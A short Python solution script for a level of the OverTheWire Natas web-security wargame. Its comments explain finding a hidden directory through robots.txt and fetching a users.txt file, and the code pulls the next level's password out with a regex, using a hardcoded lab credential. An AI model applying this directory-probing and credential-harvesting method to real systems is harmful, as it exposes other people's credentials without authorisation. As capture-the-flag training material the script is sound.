#!/usr/bin/env python

import requests
import re

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
"""grabbing starting page"""
url = 'http://%s.natas.labs.overthewire.org/' % username
"""We see a note on this page: "No more information leaks!! Not even Google will find it this time..."
So the output claiming google won't find this is a nod to robots.text, which seems to set settings for webcrawlers
Let's see if that exists?
url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
And it does, we see an output about 'Disallow: /s3cr3t/' which I think means we crawler's aren't allowed in that directory?
Now we can pull that very secretive directory
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/' % username
Hey look at that, it mentions another users.txt so we can pull that?
"""
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username
print(url) #make sure the URL works fine

response = requests.get(url, auth = (username, password))
content = response.text

"""And yes we see here that the password is there, if we care to we can get just the password outputted"""
print(content)

print(re.findall('natas4:(.*)', content))